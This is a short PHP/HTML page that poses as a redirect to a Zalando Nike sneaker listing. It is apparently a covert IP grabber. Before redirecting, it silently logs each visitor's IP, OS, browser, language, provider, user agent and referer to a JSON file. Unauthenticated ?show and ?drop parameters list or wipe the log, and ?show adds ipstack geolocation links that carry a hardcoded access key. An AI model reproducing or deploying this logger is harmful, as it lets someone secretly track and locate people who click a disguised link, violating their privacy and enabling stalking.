<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Redirecting ...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<?php

  include("./plugin.php");

  $data = new GetDataPlugin();

  $info = array(
    'ip' => $data->ip(),
    'os' => $data->os(),
    'browser' => $data->browser(),
    'lang' => $data->language(),
    'archi' => $data->architecture(),
    'provetor' => $data->provetor(),
    'agent' => $data->agent(),
    'referer' => $data->referer(),
    'date' => $data->getdate(),
  );

  $json = json_decode(file_get_contents('./database.json'));

  if ($_GET['show']) {
    foreach ($json as $info) {
      echo '<div>';
      foreach ($info as $key => $val) {
        echo '<p>' . $key . ': ' . $val . '</p>';
      }
      echo '<a href="http://api.ipstack.com/'.$info->ip.'?access_key=02f7aea2ce3c192351c4f43c5bf6f3cd">get lat/long</a>';
      echo '</div>';
      echo '<br /><br /><br /><br />';
    }
    exit();
  }

  if ($_GET['drop']) {
    file_put_contents('./database.json', json_encode([]));
    echo 'clear done!';
    exit();
  }

  array_push($json, $info);
  file_put_contents('./database.json', json_encode($json));

  header('Location: https://www.zalando.fr/nike-sportswear-m2k-tekno-baskets-basses-ni111a09n-c11.html');
  die();

?>
</body>
</html>
